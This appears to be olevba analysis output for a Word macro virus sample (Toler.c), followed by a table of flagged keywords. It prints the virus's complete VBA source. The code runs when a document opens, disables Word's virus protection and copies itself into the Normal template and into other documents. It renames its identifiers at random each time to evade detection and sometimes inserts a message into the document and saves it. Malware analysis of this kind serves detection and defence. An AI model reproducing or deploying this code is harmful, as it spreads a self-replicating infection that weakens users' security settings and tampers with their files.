olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Toler.c-6ab9a112f357b750f821bf7e78625b8b9f2514c4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Toler.c-6ab9a112f357b750f821bf7e78625b8b9f2514c4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Tolerance!
Private Type XxnwZ
  HocnbbZ As Integer
  NicfZ As Integer
  NyheakZ As Boolean
End Type

Private Sub Document_Close()

End Sub

Private Sub Document_Open()
  Randomize
  Options.VirusProtection = False
  Dim NdaqenZ As Object, DibfZ As Object
  Set NdaqenZ = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
  Set DibfZ = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
  Dim IaZ As XxnwZ, ExivsxZ As XxnwZ: IaZ = MsbnZ(NdaqenZ): ExivsxZ = MsbnZ(DibfZ)
  If ExivsxZ.NicfZ = 0 Then
     TcephsqjZ NdaqenZ, DibfZ, IaZ, ExivsxZ
     Options.SaveNormalPrompt = False
  End If
  If (IaZ.NicfZ = 0) Or ((ExivsxZ.NicfZ <> 0) And (IaZ.NicfZ <> ExivsxZ.NicfZ)) Then
     TcephsqjZ DibfZ, NdaqenZ, ExivsxZ, IaZ
    



  ElseIf Rnd < 0.3 Then
     ActiveDocument.Range(0, 0).InsertParagraphBefore
     ActiveDocument.Range(0, 0).InsertBefore "MUD Forever! :-)"
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  End If
End Sub
Private Sub TcephsqjZ(HocnbbZ As Object, YyobZ As Object, FromP As XxnwZ, ToP As XxnwZ)
  Dim PhZ As String, YkqcZ
  PhZ = HocnbbZ.Lines(FromP.HocnbbZ, FromP.NicfZ)
  YkqcZ = Array("OtmbaZ", "XxnwZ", "HocnbbZ", "YyobZ", "TofZ", "NicfZ", "NyheakZ", "NdaqenZ", "DibfZ", "IaZ", "ExivsxZ", "TcephsqjZ", "PhZ", "WxaxmZ", "AxncZ", "HkajfZ", "MsbnZ", "LkhctvnZ", "YkqcZ")
  For I = 0 To 18: LkhctvnZ PhZ, (YkqcZ(I)), OtmbaZ(PhZ): Next I
  If ToP.NyheakZ Then YyobZ.DeleteLines 1, YyobZ.CountOfLines
  YyobZ.AddFromString PhZ
End Sub
Private Function OtmbaZ(PhZ As String) As String
  Dim WxaxmZ As String: WxaxmZ = ""
  While (InStr(PhZ, WxaxmZ) <> 0) Or (Len(WxaxmZ) < 3)
     WxaxmZ = ""
     For I = 1 To 10
         If Rnd > 0.5 Then
            If Len(WxaxmZ) = 0 Then
                  WxaxmZ = WxaxmZ + Chr(Int(Rnd * 25 + 65))
            Else: WxaxmZ = WxaxmZ + Chr(Int(Rnd * 25 + 97))
            End If
         End If
     Next I
     WxaxmZ = WxaxmZ + "Z"
  Wend
  OtmbaZ = WxaxmZ
End Function
Private Sub LkhctvnZ(PhZ As String, AxncZ As String, HkajfZ As String)
  Dim I As Long
  I = 1
  While InStr(I, PhZ, AxncZ) <> 0
        I = InStr(I, PhZ, AxncZ)
        PhZ = Left(PhZ, I - 1) + HkajfZ + Mid$(PhZ, I + Len(AxncZ))
        Index = Index + 1
  Wend
End Sub
Private Function MsbnZ(TofZ As Object) As XxnwZ
  MsbnZ.HocnbbZ = 0
  MsbnZ.NicfZ = 0
  MsbnZ.NyheakZ = False
  For I = 1 To TofZ.CountOfLines
   If TofZ.Lines(I, 1) = "' Tolerance!" Then MsbnZ.HocnbbZ = I
   If TofZ.Lines(I, 1) = "End Function 'Tolerance!" Then MsbnZ.NicfZ = I - MsbnZ.HocnbbZ + 1
   If InStr(TofZ.Lines(I, 1), "Private Sub Document_Open()") = 1 Then MsbnZ.NyheakZ = True
  Next I
End Function 'Tolerance!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
